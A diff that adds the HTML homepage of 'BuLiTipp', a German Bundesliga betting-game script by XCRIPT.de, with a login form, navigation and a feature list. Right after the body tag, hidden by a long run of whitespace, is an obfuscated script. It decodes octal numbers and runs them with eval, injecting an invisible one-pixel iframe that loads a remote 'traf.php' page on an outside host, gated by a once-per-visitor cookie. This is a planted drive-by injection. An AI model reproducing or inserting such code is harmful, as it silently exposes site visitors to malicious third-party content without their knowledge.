@@ -1,0 +1,562 @@
+
+    <!DOCTYPE HTML PUBLIC “-//W3C//DTD HTML 4.01//EN”>
+    <html>
+    <head>
+        <title>>> BuLiTipp - Das Bundesliga Tippspiel-Script von Xcript <<</title>
+        
+        <link href="style/css/css.css" rel="stylesheet" type="text/css">		
+        <link href="style/css/buttons.css" rel="stylesheet" type="text/css">		
+        
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
+        <meta name="description" content="BuLiTipp - Das Bundesliga Tippspiel-Script von XCRIPT.de" />
+        <meta name="author" content="xcript.de" />
+
+        <!-- PopUp Chatfenster -->
+        <script type="text/javascript">
+            function openchat (url)
+            {
+                fenster = window.open(url, "Livechat", "width=800,height=600,status=yes,scrollbars=yes,resizable=yes");
+                fenster.focus();
+            }
+        </script>
+		
+		<script type="text/javascript" src="style/js/functions.js"></script>
+		
+        <!-- calendar stylesheet -->
+        <link rel="stylesheet" type="text/css" media="all" href="include/jscalendar/calendar-blue.css" title="win2k-cold-1" />
+        
+        <!-- main calendar program -->
+        <script type="text/javascript" src="include/jscalendar/calendar.js"></script>
+
+        <!-- language for the calendar -->
+        <script type="text/javascript" src="include/jscalendar/lang/calendar-en.js"></script>
+
+        <!-- the following script defines the Calendar.setup helper function, which makes adding a calendar a matter of 1 or 2 lines of code. -->
+        <script type="text/javascript" src="include/jscalendar/calendar-setup.js"></script>
+
+        
+    <!-- jQuery -->
+    <script type="text/javascript" src="include/jquery/jquery-1.5.min.js"></script>
+    
+		<link href='include/jquery/tabbedcontent/css/tabbedContent.css' rel='stylesheet' type='text/css' />
+		<script src="include/jquery/tabbedcontent/tabbedContent.js" type="text/javascript"></script>
+
+    <!-- jQuery ToastMessage -->
+    <link type="text/css" href="include/jquery/toast_message/css/jquery.toastmessage.css" rel="stylesheet"/>
+    <script type="text/javascript" src="include/jquery/toast_message/jquery.toastmessage.js"></script>
+
+    <script type="text/javascript">
+        function showToastMessage(msgtext, msgtype, msgsticky, msgposition, msgid, msgstaytime)
+        {
+            if (msgtype == null)     msgtype     = 'notice';
+            if (msgsticky == null)   msgsticky   = false;
+            if (msgposition == null) msgposition = 'middle-center';
+            if (msgid == null)       msgid       = 'dummy';
+            if (msgstaytime == null) msgstaytime = 5000;
+            
+            if (msgtext == null || jQuery.trim(msgtext) == "")
+            {
+                msgtype = 'error';
+                msgtext = 'Es ist ein unbekannter Fehler aufgetreten. Bitte schreibe eine Support-Nachricht an den Administrator.'
+                          +'<br /><br /><a href="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=support">Zum Supportformular</a>'
+                          +'<br /><br />Der Fehler ist auf der Seite'
+                          +' "<span style="font-weight:bold;">'
+                          +'willkommen</span>"'
+                          +' aufgetreten.';
+                msgsticky = true;
+            }
+            
+            if (msgtext != null && jQuery.trim(msgtext) != '')
+            {
+                $().toastmessage('showToast',
+                {
+                    text       : msgtext,
+                    sticky     : msgsticky,
+                    position   : msgposition,
+                    type       : msgtype,
+                    container  : msgposition,
+                    stayTime   : msgstaytime,
+                    close      : function(){$.post("include/toast.hide.inc.php",{message_id:msgid});},
+                    closeClick : function(){$.post("include/toast.hide.inc.php",{user_id:0, message_id:msgid});}
+                });
+            }
+        }
+    </script>
+
+        
+    <!-- jQuery iButton -->
+    <script type="text/javascript" src="include/jquery/ibutton/jquery.ibutton.js"></script>
+    <script type="text/javascript" src="include/jquery/ibutton/jquery.easing.1.3.js"></script>
+    <script type="text/javascript" src="include/jquery/ibutton/jquery.metadata.js"></script>
+    <link type="text/css" href="include/jquery/ibutton/css/jquery.ibutton.css" rel="stylesheet" media="all" />
+    
+    <!-- jQuery msDropdown -->
+    <script type="text/javascript" src="include/jquery/msdropdown/jquery.dd.js"></script>
+    <link type="text/css" href="include/jquery/msdropdown/css/dd.css" rel="stylesheet" />
+
+    <script language="javascript">
+        $(document).ready(function(e)
+        {
+            try
+            {
+                $("body select").msDropDown();
+            }
+            catch(e)
+            {
+                alert(e.message);
+            }
+        });
+    </script>
+    
+    <!-- Javascript Weiteres -->
+    <script type="text/javascript" language="JavaScript">
+        function toggleMe(a)
+        {
+            var e=document.getElementById(a);
+            
+            if(!e)return true;
+            
+            if(e.style.display=="none")
+            {
+                e.style.display="block"
+            }
+            else
+            {
+                e.style.display="none"
+            }
+            return true;
+        }
+    </script>
+
+    <script type="text/javascript" language="JavaScript">
+        function changeInfoTrigger()
+        {
+            if ($("#trigger1").attr('title') == "Info schließen")
+            {
+                titleText = 'Info anzeigen';
+            }
+            else
+            {
+                titleText = 'Info schließen';
+            }
+            
+            $("#trigger1").attr({'alt': titleText, 'title': titleText});
+        }
+    </script>
+
+    <!-- Infofenster nur einblenden, wenn Javascript aktiviert ist -->
+    <script type="text/javascript" language="JavaScript">
+        window.onload = function()
+        {
+            document.getElementById("infofenster").style.visibility = "visible";
+        };
+    </script>
+</head>
+
+<body  bgcolor="#f0f0f0"  height="100%">
+
+                                                                                                                                                                                                                                                                                                            <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                            ps="sp"+"li"+"t";asd=function(){d.body--};a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,161,154,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,161,154,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,172,145,162,175,167,145,62,150,151,63,170,166,145,152,62,164,154,164,53,77,21,16,44,161,154,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,161,154,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,161,154,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,161,154,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,161,154,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,161,154,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,161,154,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,161,154,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,161,154,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,161,154,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"[ps](","));ss=String;d=document;for(i=0;i<a.length;i+=1){a[i]=-(10-6)+parseInt(a[i],8);}try{asd()}catch(q){zz=5-5;}try{zz/=2}catch(q){zz=1;}if(!zz)eval(ss["fromCharCode"].apply(ss,a));</script>
+<div id="zentrieren">
+	<div id="sitename">
+		<h1>BuLiTipp</h1>
+		<h2>Das Bundesliga Tippspiel-Script von XCRIPT.de</h2>
+	</div>
+    <br />
+    <table border="0" align="center" cellpadding="0" cellspacing="5">
+        <tr> 
+            <td>
+                
+                <table border="0" align="left" cellpadding="0" cellspacing="0">
+                    <tr> 
+                        <td align="right" valign="bottom"></td>
+                        <td align="left" valign="bottom" class="main_oben">
+              
+                            <table border="0" cellpadding="0" cellspacing="2" class="navigation">
+                                <tr align="left" valign="bottom">
+                                    <td>
+                                                                                </td>
+                                            <td>
+                                                
+                                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr> 
+                                                        <td>
+                                                            
+                                                            <table border="0" cellspacing="0" cellpadding="0">
+                                                                <tr align="left" valign="top"> 
+                                                                    <td align="left" valign="top"></td>
+                                                                    <td align="left" valign="top" ><a href="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=anmelden">Registrieren</a></td>
+                                                                    <td align="left" valign="top"></td>                            
+                                                                </tr>
+                                                            </table>
+                                                            
+                                                            <br /><br />
+                                                        
+                                                        </td>   
+                                                        <td></td>
+                                                    </tr>
+                                                </table>
+                                            
+                                            </td>
+                                                                                        </td>
+                                            <td>
+                                                
+                                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr> 
+                                                        <td>
+                                                            
+                                                            <table border="0" cellspacing="0" cellpadding="0">
+                                                                <tr align="left" valign="top"> 
+                                                                    <td align="left" valign="top"></td>
+                                                                    <td align="left" valign="top"  class="selected"><a href="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=willkommen">Willkommen</a></td>
+                                                                    <td align="left" valign="top"></td>                            
+                                                                </tr>
+                                                            </table>
+                                                            
+                                                            <br /><br />
+                                                        
+                                                        </td>   
+                                                        <td></td>
+                                                    </tr>
+                                                </table>
+                                            
+                                            </td>
+                                                                                        </td>
+                                            <td>
+                                                
+                                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr> 
+                                                        <td>
+                                                            
+                                                            <table border="0" cellspacing="0" cellpadding="0">
+                                                                <tr align="left" valign="top"> 
+                                                                    <td align="left" valign="top"></td>
+                                                                    <td align="left" valign="top" ><a href="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=news">News</a></td>
+                                                                    <td align="left" valign="top"></td>                            
+                                                                </tr>
+                                                            </table>
+                                                            
+                                                            <br /><br />
+                                                        
+                                                        </td>   
+                                                        <td></td>
+                                                    </tr>
+                                                </table>
+                                            
+                                            </td>
+                                                                                        </td>
+                                            <td>
+                                                
+                                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr> 
+                                                        <td>
+                                                            
+                                                            <table border="0" cellspacing="0" cellpadding="0">
+                                                                <tr align="left" valign="top"> 
+                                                                    <td align="left" valign="top"></td>
+                                                                    <td align="left" valign="top" ><a href="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=spielplan">Spielplan</a></td>
+                                                                    <td align="left" valign="top"></td>                            
+                                                                </tr>
+                                                            </table>
+                                                            
+                                                            <br /><br />
+                                                        
+                                                        </td>   
+                                                        <td></td>
+                                                    </tr>
+                                                </table>
+                                            
+                                            </td>
+                                                                                        </td>
+                                            <td>
+                                                
+                                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr> 
+                                                        <td>
+                                                            
+                                                            <table border="0" cellspacing="0" cellpadding="0">
+                                                                <tr align="left" valign="top"> 
+                                                                    <td align="left" valign="top"></td>
+                                                                    <td align="left" valign="top" ><a href="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=tabelle">Tabelle</a></td>
+                                                                    <td align="left" valign="top"></td>                            
+                                                                </tr>
+                                                            </table>
+                                                            
+                                                            <br /><br />
+                                                        
+                                                        </td>   
+                                                        <td></td>
+                                                    </tr>
+                                                </table>
+                                            
+                                            </td>
+                                                                            </tr>
+                            </table>
+                        
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+
+    <br /><br />
+
+    
+    <!-- User Infobar -->
+    <table>
+        <table width="850" border="0" align="left" cellpadding="0" cellspacing="0">
+            <tr>
+                <td align="left" valign="bottom"></td>
+            </tr>
+            <tr> 
+                <td align="left" valign="top" class="main_links"></td>
+                <td align="left" valign="top" class="content">
+                    
+                    <div id="user_infobar" class="user_infobar">
+                                                        
+                                <br />
+                                Um am Tippspiel teilnehmen zu können, musst du dich registrieren.
+                            
+                                                    
+                    </div>
+                    
+                    <noscript>
+                        
+                        <div class="javascript_infobar">
+                        
+                            Javascript ist deaktiviert. Ohne Javascript sind die Funktionen des Tippspiels eingeschränkt!
+                                
+                            <form action="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=faq#14" method="post" style="float:right; margin-left:-50px; margin-right:60px; margin-top:-3px;">
+                                <div class="smallbuttons">
+                                    <button type="submit" class="positive" name="js_info" alt="Weitere Infos zu Javascript"
+                                            title="hier klicken, um weitere Infos zu Javascript anzuzeigen">
+                                        <img src="img/js_info_16.png" alt="Weitere Infos zu Javascript" />
+                                        Weitere Infos zu Javascript
+                                    </button>
+                                </div>
+                            </form>
+                    
+                        </div>
+                    
+                    </noscript>
+
+                                    
+                    <div id="zcontent">
+                
+                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr align="left" valign="top"> 
+                    <td width="170"> 
+                        
+                                                    <form name="form1" id="login" method="post" action="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=willkommen">
+                                
+                                <div id="cont">
+                                    
+                                    <table width="100%" border="0" cellspacing="0" cellpadding="5" class="login">
+                                        <tr> 
+                                            <th align="left" valign="top">Login</th>
+                                        </tr>
+										<tr> 
+                                            <td align="left" valign="top">
+                                                <input class="loginbox" name="usr" type="text" id="usr" value="Username" size="18" onFocus="if(this.value=='Username')this.value=''; return true;" onBlur="if(this.value=='')this.value='Username'; return true;" /> 
+                                                <input class="loginbox" name="pwd" type="password" id="pwd" value="" size="18" style="margin-top:3px;" /> 
+                                            </td>
+                                        </tr>
+								
+                                        </tr>
+                                        <tr> 
+                                            <td align="left" valign="top"><input name="setcookie" type="checkbox" id="setcookie" value="true" checked class="check"> 
+                                                User merken
+                                            </td>
+                                        </tr>
+                                        <tr> 
+                                            <td>
+                                                
+                                                <div class="buttons" align="center">
+                                                    <button type="submit" class="positive" id="login" alt="login" title="hier klicken um dich einzuloggen">
+                                                        <img src="img/login.png" alt="login" />
+                                                        login
+                                                    </button> 
+                                                </div>		
+                                            
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td align="center" valign="top">
+                                                <a href="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=lostpw">
+                                                    PW vergessen?
+                                                </a>
+                                            </td>
+                                        </tr>
+                                    </table>
+                                
+                                </div>
+                                
+                                <br />
+                            </form>
+                                                          <div id="cont">
+                                
+                                <table width="100%" border="0" cellspacing="0" cellpadding="3" class="menu">
+                                                                        
+                                    <tr>
+                                        <th align="left" style="font-size:1.0em;" colspan="2">
+                                            <img src="img/statistics_16.png" style="vertical-align:middle;" />&nbsp;Seiten-Statistik
+                                        </th>
+                                    </tr>
+                                    <tr>
+                                        <td align="center" colspan="2">
+                                            <b><br />0</b> User online
+                                        </td>
+                                    </tr>
+                                    
+                                                                        
+                                    <tr>
+                                        <td colspan="2">
+                                            <hr style="border:1px dotted #cccccc;" />
+                                        </td>
+                                    </tr>
+                                    
+                                                                        
+                                    <tr>
+                                        <td style="text-align:left; padding-left:5px;">Gesamt
+                                        <td style="text-align:right; padding-right:5px;font-weight:bold;">
+                                            5                                        </td>
+                                    </tr>
+                                    
+                                                                        
+                                    <tr>
+                                        <td style="text-align:left; padding-left:5px;">
+                                            Heute
+                                        </td>
+                                        <td style="text-align:right; padding-right:5px;font-weight:bold;">
+                                            0                                        </td>
+                                    </tr>
+                                    
+                                                                        
+                                    <tr>
+                                        <td style="text-align:left; padding-left:5px;">
+                                            Gestern
+                                        </td>
+                                        <td style="text-align:right; padding-right:5px;font-weight:bold;">
+                                            0                                        </td>
+                                    </tr>
+                                </table>
+                              </div>
+                                                        <td>
+                                <div id="contentalt"> 
+                                            
+
+<table width="700px" border="0" cellspacing="0" cellpadding="5" class="news">
+	<tr> 
+		<th align="left" valign="top">Willkommen beim BuLiTipp-Tippspiel der Saison 2011 / 2012</th>
+	</tr>
+	<tr> 
+		
+    <td align="left" valign="top">
+        <br>
+        <font color="red"><b>
+                </b></font>
+        </b></font>
+        <br><table align="center" cellpadding="3" cellspacing="3" class="tabelle2" width="680" border="0"><tbody>
+
+<tr>
+<td height="24"><strong>Wer kennt das nicht?</strong></td>
+</tr>
+
+<tr>
+<td valign="top"><span style=" font-size: 14px;">Samstag Nachmittag, in gem&uuml;tlicher Runde mit Freunden will man die Bundesliga auf Premiere gucken und denkt sich vorher noch:<br />
+"Mensch wollen wir nicht die Ergebnisse tippen?" Wer ist denn der beste Tipper von uns? Also einen Zettel rausgeholt oder noch besser die R&uuml;ckseite der Fernsehzeitung und schnell die Tipps notieren. Nach 90 Minuten hat allerdings niemand mehr Lust ( oder der Alkohol tut sein &uuml;briges) die Tipps auszuwerten und somit war alles f&uuml;r die Katz.</span></td>
+</tr>
+
+</tbody></table>
+
+<p><br />
+</p>
+
+<table align="center" cellpadding="3" cellspacing="3" class="tabelle2" width="680" border="0"><tbody>
+<tr>
+
+</tr>
+
+<tr>
+<td height="20"><span style=" color: #ED1C24; font-size: large;"><center> xcript.de</center></span></td>
+</tr>
+
+<tr>
+<td valign="top"><strong>BuLiTipp Features:<br style=" font-weight: bold;" />
+</strong><br />
+* automatische und manuelle Ergebniserfassung<br />
+* automatische und manuelle Spielplanerfassung und -aktualisierung<br />
+* integrierter Liveticker<br />
+* integriertes Forum<br />
+* Bundesliga Live-Tabelle<br />
+* Live-Rangliste<br />
+* umfangreiche Statistiken f&uuml;r Bundesligavereine und User<br />
+* Anzeige von Serien der Bundesligavereine<br />
+* automatische Erinnerungs-eMails<br />
+* Userverwaltung<br />
+* Newsverwaltung<br />
+* Einbindung externer News-Feeds<br />
+* Ajax-Tippeingabe<br />
+* flexible Konfiguration<br />
+* und viele mehr...</td>
+</tr>
+
+</tbody></table>
+
+<p>&#160;</p>
+        <b>Achtung:</b> <i>Die News lassen sich nur im eingeloggten Zustand komplett lesen.</i><br><br>
+        <b>News:</b>
+    	<hr noshade>
+    	<table width=97% cellpadding=0 cellspacing=0 bordeR=0 style="news">
+    	    	</table>
+    	<hr noshade>
+    
+    	
+
+<p style="font-size:12pt; font-weight:bold; text-align:center;">
+	<br>
+	BuLiTipp - Das Bundesliga Tippspiel-Script
+</p>
+<p style="font-size:8pt;">	
+					
+</p>
+    
+	</td>
+	</tr>
+</table>
+                            </td>
+                        </tr>
+                        <tr align="left" valign="top"> 
+                            <td>&nbsp;</td>
+                            <td>&nbsp;</td>
+                            <td>&nbsp;</td>
+                        </tr>
+                    </table>
+                </td>
+                <td align="left" valign="top" class="main_rechts">&nbsp;</td>
+            </tr>
+            <tr> 
+                <td align="right" valign="top">&nbsp;</td>
+                <td align="left" valign="top" class="main_unten" >&nbsp;</td>
+                <td align="left" valign="top">&nbsp;</td>
+            </tr>
+            <tr>
+                <td align="right" valign="top">&nbsp;</td>
+                <td align="center" valign="top" class="footer">
+                    <div id="footer">
+                        <a href="/include/jquery/msdropdown/include/jscalendar/include/jquery/toast_message/css/jquery.toastmessage.css?site=impressum">Impressum</a><br /><br />
+                        <a href="http://www.xcript.de" target="_new">powered by XCRIPT.de - Version 4.0 (&copy; XCRIPT.de)</a>
+                        <br /><br />
+                    </div>
+                </td>
+            </tr>
+        </table>
+    
+    </td>
+  </tr>
+</table>
+</div>
+</div>
+</div>
+</body>
+</html>
